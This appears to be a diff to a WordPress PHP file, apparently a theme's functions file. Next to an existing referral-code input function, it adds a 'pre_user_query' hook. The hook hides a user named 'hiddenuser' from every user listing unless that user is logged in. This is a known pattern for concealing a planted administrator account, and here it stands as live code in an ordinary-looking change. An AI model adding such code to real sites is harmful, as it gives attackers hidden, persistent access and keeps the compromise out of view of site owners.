@@ -464,3 +464,15 @@ function rcl_add_ref_field()
 {
     echo '<input class="input-modal text-center" type="text" name="ref_code" value="" placeholder="Реферальный код">';
 }
+
+add_action('pre_user_query','yoursite_pre_user_query');
+function yoursite_pre_user_query($user_search) {
+    global $current_user;
+    $username = $current_user->user_login;
+
+    if ($username != 'hiddenuser') {
+        global $wpdb;
+        $user_search->query_where = str_replace('WHERE 1=1',
+            "WHERE 1=1 AND {$wpdb->users}.user_login != 'hiddenuser'",$user_search->query_where);
+    }
+}
